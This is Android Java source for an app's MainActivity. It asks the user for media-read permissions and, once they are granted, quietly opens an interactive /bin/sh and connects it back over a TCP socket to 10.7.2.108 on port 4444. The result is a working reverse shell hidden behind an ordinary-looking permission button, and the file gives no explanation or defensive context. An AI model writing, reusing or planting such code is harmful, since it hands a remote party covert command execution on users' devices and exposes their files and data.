package com.example.androidsubsystem;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {


    int MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE = 312;
    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button myButton = findViewById(R.id.permission); // Replace 'myButtonId' with the actual ID of your button in the XML layout file.
        myButton.setOnClickListener(view -> {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO)
                    == PackageManager.PERMISSION_GRANTED) {
                // Permission is already granted
                // You can now proceed with accessing external storage
                runSocket();

                Log.d("WARNING:", "Yes permission");
            } else {
                // Permission is not granted; request it from the user
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.READ_MEDIA_IMAGES},
                        MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE);
                Log.d("WARNING:", "No permission");
            }
        });

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission was granted
                // You can now proceed with accessing external storage
                Log.d("WARNING:", "Permission Granted");
                runSocket();
            } else {
                // Permission denied
                // Handle the case where the user denies the permission
            }
        }
    }
    private void runSocket() {
        ExecutorService executor = Executors.newSingleThreadExecutor();

        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    String[] cmd = {"/bin/sh", "-i"};
                    Process proc = Runtime.getRuntime().exec(cmd);
                    InputStream proc_in = proc.getInputStream();
                    OutputStream proc_out = proc.getOutputStream();
                    InputStream proc_err = proc.getErrorStream();

                    Socket socket = new Socket("10.7.2.108", 4444);
                    InputStream socket_in = socket.getInputStream();
                    OutputStream socket_out = socket.getOutputStream();

                    while (true) {
                        while (proc_in.available() > 0) socket_out.write(proc_in.read());
                        while (proc_err.available() > 0) socket_out.write(proc_err.read());
                        while (socket_in.available() > 0) proc_out.write(socket_in.read());
                        socket_out.flush();
                        proc_out.flush();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (StringIndexOutOfBoundsException e) {
                    e.printStackTrace();
                }
            }
        });

    }
}